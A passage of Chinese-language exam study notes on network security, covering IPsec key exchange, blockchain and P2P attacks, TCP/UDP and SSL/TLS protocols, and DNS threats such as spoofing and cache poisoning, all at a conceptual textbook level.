color=red>（大概率会考）</font></p><ul><li>由于AH需要对整个IP数据包进行认证，如果先AH再使用ESP，ESP的头部和尾部会改变数据包的长度；另外，ESP的填充字段也会改变数据包的长度，造成AH认证失败。所以应该先使用ESP</li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701172903449.png" alt="image-20230701172903449" style="zoom:67%;" /></li></ul></li></ul></li></ul><h3 id="e-网络密钥交换，定义及结构"><a href="#e-网络密钥交换，定义及结构" class="headerlink" title="e) 网络密钥交换，定义及结构"></a>e) 网络密钥交换，定义及结构</h3><h4 id="网络密钥交换"><a href="#网络密钥交换" class="headerlink" title="网络密钥交换"></a><font color=pink><strong>网络密钥交换</strong></font></h4><ul><li>IPsec密钥管理方式：<ul><li>手动：手动分配，适用于规模小，节点配置稳定环境</li><li>自动：系统通过IKE协议自动为SA创建密钥，适用于大型分布式系统</li></ul></li><li>IKE(密钥交换协议)<ul><li>IKEv1：默认的IPsec自动型密钥管理协议是ISAKMP/Oakley：<ul><li>ISAKMP：互联网安全关联和密钥管理协议</li><li>Oakley密钥确定协议，基于Diffie-Hellman算法的密钥交换协议</li></ul></li></ul></li><li>密钥确定协议：<ul><li>Diffie-Hellman<ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701165322863.png" alt="image-20230701165322863" style="zoom:67%;" /></li></ul></li><li>IKE改进：<ul><li>采用Cookie机制来防止拥塞攻击</li><li>允许双方协商得到一个组，相录与Diffie-Hellman密钥交换的全局参数</li><li>使用现时值来阻止重放攻击</li><li>允许交换Diffie-Hellman的公钥值</li><li>对Diffie-Hellman交换进行身份认证，阻止中间人🐓</li></ul></li><li>Cookie机制：<ul><li>Cookie交换要求各方在初始消息中发送一个伪随机数Cookie，并要求对方确认</li><li>Cookie的产生必须满足：<ul><li>Cookie必须依赖与特定的通信方，从而防止攻击者得到一个正在使用的真正的IP地址和UDP端口的Cookie时，也无法用该Cookie向目标主机发动攻击</li><li>除了发起实体以外的任何实体都不可能产生被它承认的Cookie，即在产生和验证Cookie时要使用本地的秘密信息，而且不能从Cookie中推出秘密信息</li><li>Cookie的产生和验证必须尽快完成</li></ul></li><li>一种产生方法：对以下信息进行Hash运算，取前64位：<ul><li>源IP地址+目的IP地址+UDP源端口+UDP目的端口+随机数+当前日期+当前时间</li></ul></li></ul></li><li>组（Group)<ul><li>每个组包含两个全局参数的定义和算法标识</li></ul></li><li>防重放攻击：IKE使用现时值(nonce)来反重放攻击，即使用本地产生的伪随机数。</li><li>身份认证：<ul><li>数字签名：使用散列值签名进行身份认证</li><li>公钥加密：利用公钥对用户身份参数加密</li><li>对称密钥加密：通过带外机制得到密钥，利用密钥加密</li></ul></li><li>密钥交换：<ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701172418242.png" alt="image-20230701172418242" style="zoom:67%;" /></li></ul></li><li>IKE消息格式<ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701172534506.png" alt="image-20230701172534506" style="zoom:67%;" /></li></ul></li></ul></li></ul><h4 id="SA的四种分组"><a href="#SA的四种分组" class="headerlink" title="SA的四种分组"></a><font color=pink><strong>SA的四种分组</strong></font></h4><h2 id="区块链安全"><a href="#区块链安全" class="headerlink" title="区块链安全"></a>区块链安全</h2><h3 id="a-区块链结构，链式结构、哈希链、区块结构"><a href="#a-区块链结构，链式结构、哈希链、区块结构" class="headerlink" title="a) 区块链结构，链式结构、哈希链、区块结构"></a><strong>a)</strong> <font color=red>区块链结构</font>，链式结构、哈希链、区块结构</h3><h4 id="区块链结构"><a href="#区块链结构" class="headerlink" title="区块链结构"></a><font color=pink><strong>区块链结构</strong></font></h4><ul><li><p>区块链是一种按时间顺序将数据区块以顺序相连的方式组合成的<font color=red>链式数据结构</font>。区块链构建了一种分布式的<font color=red>价值传输网络</font>，允许缺乏信息的个体之间进行价值互联和数据共享。</p></li><li><p>类型</p><ul><li>公有链/非许可链：所有人可访问，完全去中心化，任何人任何时间都可以访问系统读数据确认交易并竞争交易记录修改权。</li><li>许可链：<ul><li>私有链：严格限制的参与节点，指定的阻止控制区块数据写权限</li><li>联盟链：由多家机构管理，管理机构运营的多个节点，只有这些特定节点可以有读写交易数据</li><li>其他：每个参与节点都需要得到许可。</li></ul></li></ul></li><li><p>核心技术：</p><ul><li>哈希函数</li><li>数字签名</li><li>网路技术：TCP/IP、路由器技术、对等网络P2P技术</li></ul></li><li><p>结构概述：</p><ul><li><p>在比特币中，区块包含区块链网络的交易，矿工节点确认通过基于工作量证明协议确认区块有效性并添加于链上。</p></li><li><p>区块分叉现象：</p><ul><li>指由于网络传输延迟，区块链矿工节点可能会在同一时间点产生两个或多个有效的区块</li></ul></li><li><p>硬分叉现象：</p><ul><li>软件升级使得新老软件不兼容，旧节点不愿意接收新节点产生的区块所形成的分叉现象。</li></ul></li><li><p>软分叉现象：</p><ul><li>当新共识规则发布后，在区中心化架构中节点不一定要升级到新的公式规则，新老节点最终都接受新老规则产生出的区块并相互认可，如新节点算力占优，则经过分支博弈后网络中节点最后认同新链的区块</li></ul></li><li><p>比特币使用Merkle Tree的数据结构把交易打包成“块”</p><ul><li><p>区块是容纳了多笔交易的数据单元，每个区块包括两个数据结构，分别是区块头和区块体</p></li><li><p>区块具体结构：</p><ul><li><p>|   字段   |                    描述                    |                             大小                             |<br>| :———: | :————————————————————: | :—————————————————————————————: |<br>|  区块头  | 记录本区块的摘要信息，包含前一区块的哈希值 |                            80字节                            |<br>| 区块大小 |      记录本区块的具体大小，以字节表示      |                            4字节                             |<br>| 交易计数 |         记录本区块所包含的交易总数         |                         1-9可变整数                          |<br>|   交易   |           记录每笔交易的详细信息           | 可变大小(每个区块所能存放的交易数量有限，与网络交易验证和区块传播速度有关) |</p></li><li><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701191710007.png" alt="image-20230701191710007" style="zoom:67%;" /></p></li></ul></li></ul></li><li><p>区块的链接起始于一个称为<strong>创世区块</strong>的特殊区块，后续区块随着矿工节点解决密码学难题而产生</p></li><li><p>目标值：</p><ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701191940111.png" alt="image-20230701191940111" style="zoom:67%;" /></li><li>目标值越小，满足目标值的解的个数越少，哈希值的计算越难。</li></ul></li><li><p>激励机制：区块奖励（块奖励+交易费）</p><ul><li>块奖励：每210000个块，奖励减半，每四年减半一次</li><li>交易费：交易的发布者为激励矿工付出额外的交易费用</li></ul></li><li><p>交易是区块体最基本的单元，包括输入、输出、交易哈希值、版本号、时间戳数据域，输入和输出分别指向一个未花费的地址单元，UTXO。</p><ul><li>输入：上一笔交易未被花费的输出</li><li>输出：标识一笔转到新地址的UTXO</li><li>版本号：标识交易遵循哪一种交易验证原则</li></ul></li><li><p>区块链上的用户通过花费其可以解锁的UTXO进行交易，交易过程满足：</p><ul><li>交易的所有输出UTXO数值总和必须等于所有输入UTXO数字的总和</li><li>交易的输入必须为未被花费的UTXO</li><li>一个UTXO在一次交易必须被完全花费</li></ul></li></ul></li><li><p>区块链的发展：4个阶段</p><ul><li>区块链1.0：数字货币的启蒙时代<ul><li>主要包括比特币、莱特币等在内的数字加密货币项目，仅能支持非图灵完备的脚本语言</li></ul></li><li>区块链2.0：智能合约<ul><li>以太坊，支持用户在分布式平台搭建去中心化应用</li></ul></li><li>区块链3.0：演升应用平台<ul><li>增加政务、智慧医疗、数字知识产权等；针对数字资产保护技术的集合；实现高并发、低能耗的并行分布式数据账本</li></ul></li></ul></li></ul><h3 id="b-区块链主要协议，共识协议、地址生成"><a href="#b-区块链主要协议，共识协议、地址生成" class="headerlink" title="b)区块链主要协议，共识协议、地址生成"></a><strong>b)</strong><font color=red>区块链主要协议</font>，共识协议、地址生成</h3><h4 id="区块链三元悖论"><a href="#区块链三元悖论" class="headerlink" title="区块链三元悖论"></a><font color=pink><strong>区块链三元悖论</strong></font></h4><ul><li>高性能瓶颈与关键技术</li><li>大规模节点或大规模数据量场景下，性能急剧下降</li><li>高性能的公式算法设计</li><li>智能合约执行引擎的效率优化</li><li>采取新型共识机制提高共识效率和安全性</li></ul><h3 id="c-节点运行机制，P2P点对点网络"><a href="#c-节点运行机制，P2P点对点网络" class="headerlink" title="c) 节点运行机制，P2P点对点网络"></a>c) 节点运行机制，P2P点对点网络</h3><h4 id="P2P点对点网络"><a href="#P2P点对点网络" class="headerlink" title="P2P点对点网络"></a><font color=pink><strong>P2P点对点网络</strong></font></h4><ul><li>P2P对等式网络，又称点对点技术，减低以往路传输中的节点，以降低资料遗失的风险；每个用户端既是一个节点，也有服务器的功能，任何一个节点无法直接找到其他节点，必须依靠其用户群进行信息交流</li><li>网络层是系统节点之间进行数据交互的组成部分。目前大多数区块链网络层采用的是分布式P2P组网架构，依赖P2P组网架构，区块链节点可以在无需依赖可信的第三方节点完成通信；其主要功能是为共识层提供可靠、对等和安全的网络结构和通信环境</li><li>攻击方式：日蚀攻击、BGP劫持攻击、窃听攻击和拒绝服务攻击</li><li>传播机制：指建立连接的节点之间进行广播通信，针对传播机制常发起交易延展攻击</li><li>验证机制：保证节点在传播和写入的区块信息的真实性</li><li>网络层安全目标：匿名性、抗DoS攻击、拓扑结构隐藏</li><li>常见攻击方式：拒绝服务攻击、女巫攻击<ul><li>拒绝服务攻击：故意耗尽被攻击对象资源，使其无法正常提供服务<ul><li>防御手段：<ul><li>增强协议容忍性</li><li>流量监控及系统扫描</li><li>端口过滤</li></ul></li></ul></li><li>女巫攻击：通过少量节点伪装出大量的节点身份标记来欺骗在区块链网络中的其他节点，把数据备份到少量的真实节点中，从而只需要控制这些节点就能破化系统的数据备份功能<ul><li>攻击类型：<ul><li>直接攻击：诚实节点直接收到Sybil节点的影响</li><li>间接攻击：与Sybil节点直接通信的节点攻击诚实节点</li></ul></li><li>防御手段：<ul><li>向不同成员赋予不同权力</li><li>增加身份创建成本</li><li>身份验证：直接和间接</li></ul></li></ul></li></ul></li></ul><h2 id="传输层安全"><a href="#传输层安全" class="headerlink" title="传输层安全"></a>传输层安全</h2><h3 id="a-传输层协议，UDP协议、TCP协议"><a href="#a-传输层协议，UDP协议、TCP协议" class="headerlink" title="a) 传输层协议，UDP协议、TCP协议"></a>a) 传输层协议，UDP协议、TCP协议</h3><h4 id="传输层协议"><a href="#传输层协议" class="headerlink" title="传输层协议"></a><font color=pink><strong>传输层协议</strong></font></h4><ul><li>传输层提供应用数据安全传输服务的协议，包括：安全套接字(SSL)、传输层安全协议(TLS)和SSL/TLS VPN</li><li>TCP/IP体系结构中包含两个重要的传输层协议：<ul><li>用户数据报协议UDP</li><li>传输控制协议TCP</li></ul></li><li>S/MIME：安全/多用途，Internet邮件扩展</li><li>Kerberos：可信的第三方认证协议</li><li>SMTP：简单的邮件传输协议</li><li>HTTP：超文本传输协议</li></ul><h4 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a><font color=pink><strong>UDP协议</strong></font></h4><ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701201922805.png" alt="image-20230701201922805" style="zoom:67%;" /></li><li>UDP是无连接通信协议，提供的是不可靠的端到端数据传输服务</li><li>UDP位于IP层之上。应用程序访问UDP层，然后使用IP层传送数据报。IP包的数据部分就是UDP数据报。IP层的报头指明了源主机和目的主机地址，而UDP层的报头指明了主机上的源端口和目的端口，UDP传输的段由8个字节的报头和有效载荷字段构成<ul><li>源端口：源端口号，2字节，<font color=red>由于UDP协议提供的是不可靠的数据传输服务，所以不需要应答</font>，因此UDP的源端口号是可选的，不用设置为0</li><li>目的端口</li><li>长度：UDP用户数据报的长度（包括首部和数据部分在内的总的字节数）</li><li>检验和：防止UDP用户数据包在传输中出错，可选</li></ul></li><li>UDP使用报头中的校验值来保证数据的安全</li><li>校验值传递到接收方之后，还需要重新计算（IP数据报的检验和只检验IP数据报的首部）</li><li>UDP协议可用于风暴型DDoS攻击</li></ul><h4 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a><font color=pink><strong>TCP协议</strong></font></h4><ul><li><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701202933794.png" alt="image-20230701202933794" style="zoom:67%;" /></p></li><li><p>与UDP协议不同，TCP协议是面向链接的，提供可靠、有序的端到端数据传输服务</p><ul><li>来源链接端口</li><li>目的链接端口</li><li>序列号</li><li>确认号</li><li>数据偏移</li><li>保留</li><li>标志符</li><li>窗口</li><li>校验和</li><li>紧急指针</li></ul></li><li>TCP连接有关的控制比特：<ul><li>确认位(ACK)：当ACK=1时，确认号字段才有效；当ACK=0时，确认号无效</li><li>复位号(RST)：当RST=1时，表明TCP连接中出现严重差错，必须释放连接，然后重新建立传输连接</li><li>同步位(SYN)：在连接建立时用来同步序号。当SYN=1而ACK=0时，表明这是一个连接请求报文段。对方同意建立连接，则响应报文段中SYN=1和ACK=1</li><li>终止位(FIN)：用来释放连接。当FIN=1，表明报文发送完毕，需要释放</li></ul></li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701203646981.png" alt="image-20230701203646981" style="zoom:67%;" /></li><li>安全性分析：<ul><li>网络扫描：利用TCP连接建立过程进行端口扫描，从而获得目标主机上的网络服务状态</li><li>Dos</li><li>TCP会话劫持攻击：TCP协议对数据包没有加密和认证措施，因此攻击者可以监听到TCP报头内同，或伪造TCP报文，实施TCP会话劫持攻击</li></ul></li></ul><h3 id="b-SSL体系结构、协议模式，握手协议"><a href="#b-SSL体系结构、协议模式，握手协议" class="headerlink" title="b) SSL体系结构、协议模式，握手协议"></a><strong>b)</strong> <font color=red>SSL体系结构、协议模式，握手协议</font></h3><h4 id="SSL体系结构"><a href="#SSL体系结构" class="headerlink" title="SSL体系结构"></a><font color=pink><strong>SSL体系结构</strong></font></h4><ul><li>安全套接字(SSL)协议，为Web浏览器与Web服务器之间安全交换信息提供支持</li><li>两种使用模式<ul><li>一种是将SSL作为传输层之上、应用层之下的一个独立协议子层，对用户程序完全透明；</li><li>将SSL嵌入到特定的应用里，如绝大多数浏览器和Web服务器中都实现了SSL协议</li></ul></li><li>SSL利用TCP协议为上层应用提供端到端的安全传输服务，包括认证和加密</li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701204328797.png" alt="image-20230701204328797" style="zoom:67%;" /></li><li>SSL分两个子层，下面一层是SSL’记录协议，为高层协议，如HTTP协议；提供基本的安全服务</li><li>上面一层包括三个协议：SSL握手协议、SSL密码变更规格协议和SSL报警协议；对SSL信息交换进行管理</li><li>有了SSL，应用层数据不再直接传递给传输层，而是传递给SSL层，由SSL层对应用层收到的数据加密，并增加SSL首部<ul><li>eg：<img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701204639831.png" alt="image-20230701204639831" style="zoom:67%;" /></li></ul></li><li>几个协议的关系：<ul><li>使用握手协议协商加密和MAC算法以及保密密钥、身份认证</li><li>使用密码变更规格协议变更连接上使用的密码机制</li><li>使用记录协议对交换的数据进行加密和签名</li><li>使用报警协议定义数据传输过程中出现的问题并通知相关方</li></ul></li><li>两个重要概念：<ul><li>连接：一种能够提供合适服务类型的传输通道；每天连接都与一个会话关联</li><li>会话：指客户与服务器之间的一种关联；目的是避免为每次建立连接而进行复杂的密码参数协商过程</li></ul></li><li>任何一对通信实体之间可以有多条安全连接，理论上也允许一对实体之间同时有多个会话，实际很少出现</li><li>每个会话有多种状态；一旦会话建立，就进入当前操作状态。在握手协议执行期间，会进入读挂起状态和写挂起状态。握手完成，挂起状态又回到当前操作状态</li><li>SSL保障了机密性、完整性、认证性</li></ul><h4 id="SSL记录协议"><a href="#SSL记录协议" class="headerlink" title="SSL记录协议"></a><font color=pink><strong>SSL记录协议</strong></font></h4><ul><li>记录协议在SSL握手协议完成客户端和服务器之间的握手过程后使用，即客户端和服务器完成双方身份鉴别并确定安全信息交换使用的算法后执行；保密性和完整性；</li><li>报文格式：<img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701205845958.png" alt="image-20230701205845958" style="zoom:67%;" /></li><li>首部包括4个字段：内容类型、主版本、次版本和压缩后的长度</li><li>处理过程：<img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701210014804.png" alt="image-20230701210014804" style="zoom:67%;" /><ul><li>记录协议接收到一个要传送的应用消息后，将其分段为块、压缩、添加MAC(消息认证码)、加密，最后加上SSL首部，并将得到的最终数据单元交TCP协议发送</li><li>接收方对接收的数据执行相反的操作：解密、完整性验证、解压、报文重组，最后将重组完成的数据交上层用户</li></ul></li><li>SSL采用的是链式加密的方法：采用对称加密算法机密消息(SSL记录协议)，用公开密码算法交换对称加密算法的对称密钥(SSL握手协议)</li></ul><h4 id="SSL密码变更规格协议"><a href="#SSL密码变更规格协议" class="headerlink" title="SSL密码变更规格协议"></a><font color=pink><strong>SSL密码变更规格协议</strong></font></h4><ul><li>协议又一个仅包含一个字节且值为1的消息组成，使得连接从挂起状态改变到当前状态，用于更新此连接使用的密码组</li><li><font color=red>为什么不作为其它协议（如握手协议）的一 条报文而要独立成一个协议？</font><ul><li>因为SSL规定通信双方知道他们发送或收到更改密码规格协议信息时才能开始使用前面已经协商好的密码套件</li></ul></li></ul><h4 id="Alert报警协议"><a href="#Alert报警协议" class="headerlink" title="Alert报警协议"></a><font color=pink><strong>Alert报警协议</strong></font></h4><ul><li>当客户端和服务器端发现错误，需要通过报警协议向对方发送报警消息<ul><li>同应用数据一样，SSL报警协议报文同样交由SSL记录进行压缩和加密处理后发送</li></ul></li><li>格式：<ul><li>第一个字节表示报警类型：1表示报警；2表示致命错误；如果是2，则关闭SSL连接，会话中的其他连接继续</li><li>第二个字节包含报警信息</li></ul></li></ul><h4 id="握手协议"><a href="#握手协议" class="headerlink" title="握手协议"></a><font color=pink><strong>握手协议</strong></font></h4><ul><li>SSL握手协议是客户端和服务器用SSL连接通信时的第一个子协议，在开始传输上层应用数据之前使用。</li><li>该协议允许服务器和客户端相互验证，协商加密和MAC算法以及加密密钥，用来保护在SSL记录协议中发送的数据</li><li>协议格式：<img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701211844314.png" alt="image-20230701211844314" style="zoom:67%;" /><ul><li>类型：消息类型码</li><li>长度：消息长度字节数</li><li>内容：与消息相关的参数</li></ul></li><li>客户端与服务器之间建立逻辑连接的初始交换过程包括四个阶段</li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701212058806.png" alt="image-20230701212058806"  /><ul><li>阶段一：建立安全连接请求，包括协议版本，会话标志，密码构件，压缩方法和初始随机数</li><li>阶段二：服务器发送证书，密钥交换，请求证书。服务器发出问候消息阶段结束信号</li><li>阶段三：如果收到证书请求，客户端发送证书。客户端发送密钥交换数据，也可以发送证书验证消息</li><li>阶段四：变更密码构件，结束握手协议</li></ul></li></ul><h4 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a><font color=pink><strong>密钥生成</strong></font></h4><ul><li>共享密钥是利用安全密钥交换为此会话建立的一个一次性48字节的值，生成过程分为：<ul><li>交换预备主密钥</li><li>双方计算主密钥</li></ul></li><li>得到主密钥后，从共享主密钥中计算出密钥参数</li></ul><h4 id="SSL安全分析"><a href="#SSL安全分析" class="headerlink" title="SSL安全分析"></a><font color=pink><strong>SSL安全分析</strong></font></h4><ul><li>安全隐患：<ul><li>预主密钥——-&gt;主密钥———&gt;SSL会话密钥</li><li>能否保证随机数质量也是SSL的安全隐患</li><li>有可能遭受中间人攻击</li><li>利用SSL的攻击无法被IDS检测和FW过滤</li><li>web服务器使用SSL时，吞吐量下降</li><li>不能保证Web浏览器和服务器自身安全</li></ul></li><li>增强安全性：<ul><li>增强主密钥的保密性：<ul><li>预主密钥的口令加密方法和硬件加密方法</li></ul></li><li>提高随机数的质量</li><li>提高证书CA的可靠性</li></ul></li></ul><h3 id="c-TLS结构与协议模式，TLS与SSL差异"><a href="#c-TLS结构与协议模式，TLS与SSL差异" class="headerlink" title="c) TLS结构与协议模式，TLS与SSL差异"></a>c) TLS结构与协议模式，TLS与SSL差异</h3><h4 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a><font color=pink><strong>TLS</strong></font></h4><ul><li>传输层安全TLS</li><li><strong>TLS与SSL的差异</strong>：<ul><li>版本号：TLS 1.0的主版本号为3，次版本号为1，而SSL 3.0的主版本号为3，次版本号为0；</li><li>消息认证码：TLS的MAC与SSL的MAC有两点不同：<ul><li>TLS使用RFC2104中定义的HMAC算法</li><li>TLS使用称为“PRF”的伪随机函数</li></ul></li><li>报警码：TLS继承了SSL中定义的所有报警码(除no_certificate)，同时还定义了新的报警码</li><li>密码套件：TLS不支持Fortezza密钥交换、加密算法</li><li>客户端证书类型</li><li>CertificateVerify消息</li><li>Finished消息</li><li>密码计算：计算主密钥的方式不同</li><li>填充：SSL中，填充后的数据长度正好是分组加密算法中分组长度的最小整数倍。而TLS可以时分组长度的<u>任意整数倍</u>。</li></ul></li></ul><h4 id="SSL-TLS-VPN"><a href="#SSL-TLS-VPN" class="headerlink" title="SSL/TLS VPN"></a><font color=pink><strong>SSL/TLS VPN</strong></font></h4><ul><li>简称SSL VPN</li><li>IPsec VPN有不足之处：<ul><li>无法实现基于用户的授权</li><li>可能泄露内部网络结构</li></ul></li><li>利用基于SSL/TLS的VPN可以很好解决远程终端访问内部网络的问题</li><li>实现过程：<img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701214424735.png" alt="image-20230701214424735" style="zoom:80%;" /></li><li>与单纯SSL/TLS相比SSL VPN利用TCP以及SSL对TCP会话的保护，可实现对基于TCP。UDP、IP的应用的保护</li><li>与IPsec VPN相比，可以提供更细粒度的访问控制</li><li>实际应用中，IPsec VPN与SSL VPN应用场景不同<ul><li>IPsec VPN在网络层实现加密通信，主要应用于将远程终端或分支机构网络于机构内部网络安全连接起来</li><li>SSL VPN用于远程终端通过Web浏览器访问内部网络中的应用服务器。</li></ul></li></ul><h2 id="DNS安全"><a href="#DNS安全" class="headerlink" title="DNS安全"></a>DNS安全</h2><h3 id="a-DNS服务，定义及原理"><a href="#a-DNS服务，定义及原理" class="headerlink" title="a) DNS服务，定义及原理"></a>a) DNS服务，定义及原理</h3><h3 id="b-DNS运营机制"><a href="#b-DNS运营机制" class="headerlink" title="b) DNS运营机制"></a>b) DNS运营机制</h3><ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702100624408.png" alt="image-20230702100624408" style="zoom:67%;" /></li><li>DNS采用客户服务器方式：每一个域名服务器不但能够进行一些域名到IP地址的转换，而且还必须具有连向其他域名服务器的信息<ul><li>当一个应用进程需要将主机名映射为IP地址时，该应用进程就成为域名系统DNS的一个客户，并将待转换的域名放在DNS请求报文中，以UDP数据报方式发给本地域名服务器</li><li>本地域名服务器在查找域名后，将对应的IP地址放在回答报文中返回</li><li>应用进程获得目的主机的IP地址后即可进行通信</li><li>域名服务器不能回答该请求，则此域名服务器就暂时成为DNS中的另一个客户，直到找到能回答该请求的域名服务器为止。</li><li>域名服务器也叫域名解析器；对于用户来说，解析器是服务端，对于域名服务器而言，解析器又是客户端</li></ul></li><li>DNS有两种方式：递归和迭代<ul><li>DNS客户端一般都是递归服务器：<ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702103455362.png" alt="image-20230702103455362" style="zoom:67%;" /></li></ul></li><li>服务器之间采用迭代方式<ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702103533629.png" alt="image-20230702103533629" style="zoom:67%;" /></li></ul></li><li>循环与迭代结合：<ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702104259580.png" alt="image-20230702104259580" style="zoom:67%;" /></li></ul></li><li>递归查询举例：<ul><li>浏览器缓存——-&gt;系统hosts文件——-&gt;本地DNS解析器缓存——-&gt;本地域名服务器——-&gt;根域名服务器——-&gt;主域名服务器——-&gt;下一级域名域名服务器 客户端——-&gt;本地域名服务器(递归)本地域名服务器——-&gt;DNS服务器的交互查询是迭代查询</li></ul></li></ul></li></ul><h3 id="c-域名系统，主要流转流程"><a href="#c-域名系统，主要流转流程" class="headerlink" title="c) 域名系统，主要流转流程"></a><strong>c)</strong> <font color=red>域名系统</font>，主要流转流程</h3><h4 id="域名系统"><a href="#域名系统" class="headerlink" title="域名系统"></a><font color=pink><strong>域名系统</strong></font></h4><ul><li>域名系统DNS：作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网<ul><li>将难记的IP地址映射为容易记忆的主机名称</li><li>DNS使用UDP端口53</li></ul></li><li>域名解析就是域名到IP地址的转换过程，由DNS服务器完成；用户可以通过输入IP访问，也可以输入域名访问</li><li>除域名解析，现代DNS还有：<ul><li><strong>应用层路由</strong>：DNS把用户的访问指向离用户最近的那个CDN服务器节点，实现负载均衡</li><li>CDN(内容分发网络)：构建在现有网络基础上的智能虚拟网络，依靠边缘服务器和中心平台，降低网络拥塞<ul><li>CDN的关键技术：内容存储和分发技术</li><li><font color=red>DNS时CDN的基础</font>：除指向外也为服务器提供了负载均衡的功能，相当于DNS实现了应用层路由</li></ul></li><li>邮件交换记录MX：一种资源记录类型，用于指定负责处理发往收件人域名的邮件服务器；MX记录允许设置一个优先级决定多个邮件服务器使用哪个</li><li>简单邮件传输协议(SMTP):根据MX记录值决定邮件的路由过程</li><li><strong>作为信任的基础</strong>：放伪造邮件、验证证书申请者身份</li><li><strong>作为公钥基础设施PKI</strong>：防止CA在未经网站所有者授权的前提下，签发非法证书，防止假冒网站和中间人攻击</li></ul></li></ul><h3 id="d-DNS主要安全威胁"><a href="#d-DNS主要安全威胁" class="headerlink" title="d) DNS主要安全威胁"></a>d) DNS主要安全威胁</h3><ul><li><p>DNS建立在互相模型的基础上，是一个完全开放的协作体系，没有信息保护和认证机制，也没有对各种查询进行准确识别，对网络基础设施和核心骨干设备的攻击没有足够重视；主要表现为：协议脆弱性、实现脆弱性、操作脆弱性；</p><ul><li><p>协议脆弱性：在协议设计之初对假设条件考虑不充分或条件发生改变或设计错误导致安全问题；由于DNS协议缺乏必要的认证机制，客户无法确认接收消息的真实性和权威性，基于名字的认证过程并不能起到真正的识别作用，而且接收的应答报文中往往有额外的附加信息；此外，DNS的绝大部分通信使用UDP，数据报文易丢失、劫持和欺骗</p><ul><li><p>面临的主要威胁是域名欺骗和网络通信攻击：</p><ul><li>域名欺骗：域名系统接收或使用来自未授权主机的不正确信息，事务ID欺骗和缓存投毒，攻击者伪装成客户可行DNS服务器，然后将伪造的恶意信息反馈给用户。</li><li><p>最常见的域名欺骗攻击是针对DNS数据报首部的事务IP进行欺骗：</p><ul><li>客户端会使用该ID作为响应数据报是否与查询数据包匹配的判断依据，通过伪装DNS服务器提前向客户发送与查询数据包ID相同的响应报文，只要该伪造的响应报文在真正报文之前到达客户端，就可以实现域名欺骗</li><li>ID获取主要采用：网络监听和序列号猜测<ul><li>常使用ARP地址解析协议欺骗的方法进行监听，要求攻击者和客户处在同意网络环境中</li><li>由于DNS查询报文的事务ID字段为2个字节，其值只能是0~65535</li></ul></li></ul></li><li><p>缓存投毒：为减少带宽消耗和客户端延迟，名字服务器会将资源记录缓存起来，在数据生存期(TTL)可以直接查询；</p><ul><li>攻击者将“污染”的缓存记录插入到正常的DNS服务器的缓存记录中，所谓污染的缓存记录是指DNS解析服务器中域名所对应的IP地址不是真实的地址，而是攻击者篡改的地址，对应着攻击者控制的服务器</li><li>攻击者利用DNS协议中缓存机制对附加区数据不做任何检查的漏洞，欺骗名字服务器缓存具有较大TTL的虚假资源记录达到长期欺骗客户端的目的</li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702111227308.png" alt="image-20230702111227308" style="zoom:67%;" /></li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702111256301.png" alt="image-20230702111256301" style="zoom:67%;" /></li><li>有效TTL时段内，虚假记录会扩散到其他名字服务器：<ul><li>攻击具有隐蔽性：不用消耗太多网络资源</li><li>采用间接攻击方式使得客户端和服务端受到攻击</li><li>使用貌似合法的记录污染缓存</li><li>缺乏相应的反污染机制</li></ul></li></ul></li><li>网络通信攻击：针对DNS的网络通信攻击主要是DDoS攻击、恶意网址重定向和中间人攻击</li><li>针对DNS的拒绝服务器攻击通常为：<ul><li>攻击DNS系统本身，包括对名字服务器和客户端进行攻击</li><li>利用DNS系统作为反射点🐓其他目标</li></ul></li><li>针对DNS系统客户端的DoS攻击，主要通过发送否定回答显示域名不存在，制造黑洞效应，对客户端造成事实上的DoS攻击</li><li>反射式攻击中，攻击者利用域名服务器作为反射点，用DNS应答对目标进行泛洪攻击。DNS承担域名和IP地址映射任务，从而收到大量亲贵导致崩溃</li><li>在恶意网址重定向和中间人攻击过程中，攻击者伪装成客户可信任实体对通信过程进行分析和篡改，将客户请求重定向到假冒网站或与请求不符的的目的地址窃取信息。<ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702113456279.png" alt="image-20230702113456279" style="zoom:67%;" /></li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702113544269.png" alt="image-20230702113544269" style="zoom:67%;" 